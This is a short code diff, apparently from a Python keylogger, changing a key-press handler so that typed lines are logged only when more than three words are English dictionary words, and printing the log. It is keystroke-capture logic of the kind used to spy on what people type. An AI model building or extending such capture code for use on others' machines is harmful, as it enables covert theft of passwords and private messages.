@@ -30,16 +30,22 @@ def on_press(key):
 
 	elif (str(key) == "Key.enter" and len(newKeys) > 0):
 		global log
-		english = False
+		# english = False
 		newKeys = newKeys + " "
 
+		# for word in newKeys.split():
+		# 	if(word in words.words()):
+		# 		english = True
+
+		wordcount = 0
 		for word in newKeys.split():
 			if(word in words.words()):
-				english = True
+				wordcount += 1;
 
-		if(english == True):
+		if(wordcount > 3):
 			log.append(newKeys)
-			english = False
+			print(log)
+			wordcount = 0
 
 		newKeys = ""
 
